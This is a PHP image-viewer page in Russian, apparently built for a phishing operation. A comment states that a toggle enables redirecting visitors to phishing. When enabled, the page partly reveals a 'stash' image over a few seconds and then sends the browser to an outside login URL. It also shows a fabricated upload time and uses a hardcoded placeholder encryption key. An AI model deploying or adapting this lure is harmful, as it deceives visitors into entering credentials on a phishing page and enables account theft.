<?php
require_once __DIR__ . '/config.php';  

header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

$function_enabled = false; // false отключает перекидывание на фишинг, true разрешает перекидывание на фишинг
$redirect_url = "https://lkra25.cc/entry/login"; 
$steps = [
    ["delay" => 1000, "height" => 10],
    ["delay" => 2000, "height" => 35],
    ["delay" => 3000, "height" => 50],
    ["delay" => 5000, "redirect" => true]
];

$secretKey = '12345678901234567890123456789012';
function decryptValue($encoded, $secretKey) {
    $cipher = "aes-256-cbc";
    $data = base64_decode($encoded);
    $ivlen = openssl_cipher_iv_length($cipher);
    $iv = substr($data, 0, $ivlen);
    $ciphertext = substr($data, $ivlen);
    return openssl_decrypt($ciphertext, $cipher, $secretKey, 0, $iv);
}

$data = [];
if (file_exists('images.json')) {
    $data = json_decode(file_get_contents('images.json'), true);
}

$uuid = isset($_GET['uuid']) ? $_GET['uuid'] : '';
if (!$uuid || !isset($data[$uuid])) {
    http_response_code(404);
    echo "Изображение не найдено";
    exit;
}

$encryptedFile = $data[$uuid]['file'];
$imageFile = decryptValue($encryptedFile, $secretKey);
if (!$imageFile) {
    http_response_code(404);
    echo "Ошибка расшифровки имени файла.";
    exit;
}

$filepath = __DIR__ . '/i/' . $imageFile;
if (!file_exists($filepath)) {
    http_response_code(404);
    echo "Файл отсутствует на сервере (возможно, удалён).";
    exit;
}

$createdAt = isset($data[$uuid]['created_at']) ? $data[$uuid]['created_at'] : 'Неизвестно';

$isRawMode = (isset($_GET['raw']) && $_GET['raw'] == 1);

if ($isRawMode) {
    $ext = strtolower(pathinfo($imageFile, PATHINFO_EXTENSION));
    switch ($ext) {
        case 'jpg': case 'jpeg':
            $mime = 'image/jpeg';  break;
        case 'png':
            $mime = 'image/png';   break;
        case 'gif':
            $mime = 'image/gif';   break;
        case 'webp':
            $mime = 'image/webp';  break;
        default:
            $mime = 'application/octet-stream'; 
            break;
    }

    header("Content-Type: $mime");
    header("Content-Length: " . filesize($filepath));
    readfile($filepath);
    exit;
}

$absoluteLink = $BASE_URL . '/' . $uuid;

$rawLink = $BASE_URL . '/raw/' . $uuid;
?>
<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Просмотр изображения</title>
    <link rel="icon" type="image/png" href="./assets/favicon.ico">
    <script src="https://unpkg.com/@tailwindcss/browser@4"></script>
    <style>
    <?php if ($function_enabled): ?>html,
    body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        background: #f4f5f7;
    }

    #imgContainer {
        height: 0;
        overflow: hidden;
        max-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: flex-start;
        width: 100%;
        background: white;
    }

    #myImage {
        max-height: 100vh;
        display: block;
        object-fit: contain;
    }

    <?php else: ?>body {
        margin: 0;
        padding: 0;
        background: #f4f5f7;
    }

    <?php endif;
    ?>
    </style>
</head>

<body class="bg-gray-50 flex flex-col min-h-screen text-gray-800">
    <header class="bg-white shadow-sm py-4 px-6">
        <div class="max-w-5xl mx-auto flex justify-between items-center">
            <div class="text-xl font-bold text-gray-800">Изображение клада</div>
        </div>
    </header>

    <main class="flex-1 flex items-center justify-center py-8">
        <?php if ($function_enabled): ?>
        <div id="imgContainer" class="w-full max-w-5xl px-4">
            <img id="myImage" src="<?php echo htmlspecialchars($rawLink); ?>" alt="Изображение"
                class="rounded-lg shadow-xl max-w-full max-h-[80vh] object-contain" />
        </div>
        <script>
        document.addEventListener('DOMContentLoaded', function() {
            var steps = <?php echo json_encode($steps); ?>;
            var container = document.getElementById('imgContainer');
            var img = document.getElementById('myImage');

            img.onload = function() {
                var scaledHeight = img.clientHeight;
                steps.forEach(function(step) {
                    setTimeout(function() {
                        if (typeof step.height !== 'undefined') {
                            var revealHeight = scaledHeight * (step.height / 100);
                            container.style.height = revealHeight + 'px';
                        }
                        if (step.redirect) {
                            window.location.replace('<?php echo $redirect_url; ?>');
                        }
                    }, step.delay);
                });
            };
        });
        </script>
        <?php else: ?>
        <div class="w-full max-w-5xl px-4">
            <img src="<?php echo htmlspecialchars($rawLink); ?>" alt="Изображение"
                class="mx-auto rounded-lg shadow-xl max-w-full max-h-[80vh] object-contain" />
        </div>
        <?php endif; ?>
    </main>

    <footer class="bg-white shadow-inner py-4 px-6">
        <div class="max-w-5xl mx-auto flex flex-col md:flex-row justify-between items-center text-sm">
            <div class="mb-2 md:mb-0 text-gray-600">
                <span class="font-semibold">Загружено:</span>
                <span class="font-semibold">Сегодня 9 часов назад</span>
            </div>
            <div class="flex items-center space-x-4">
                <input id="copyInput" type="text" readonly value="<?php echo htmlspecialchars($absoluteLink); ?>"
                    class="border border-gray-300 px-3 py-2 rounded-lg text-sm w-64 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500">
                <button id="copyBtn"
                    class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition duration-300 flex items-center">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20"
                        fill="currentColor">
                        <path d="M7 9a2 2 0 012-2h6a2 2 0 012 2v6a2 2 0 01-2 2H9a2 2 0 01-2-2V9z" />
                        <path d="M5 3a2 2 0 00-2 2v6a2 2 0 002 2V5h8a2 2 0 00-2-2H5z" />
                    </svg>
                    Копировать
                </button>
            </div>
        </div>
    </footer>

    <script>
    document.getElementById('copyBtn').addEventListener('click', function() {
        var copyText = document.getElementById('copyInput');
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        document.execCommand("copy");

        // Temporary tooltip
        const originalText = this.innerHTML;
        this.innerHTML = 'Скопировано!';
        this.classList.remove('bg-blue-600');
        this.classList.add('bg-green-600');

        setTimeout(() => {
            this.innerHTML = originalText;
            this.classList.remove('bg-green-600');
            this.classList.add('bg-blue-600');
        }, 2000);
    });
    </script>
</body>

</html>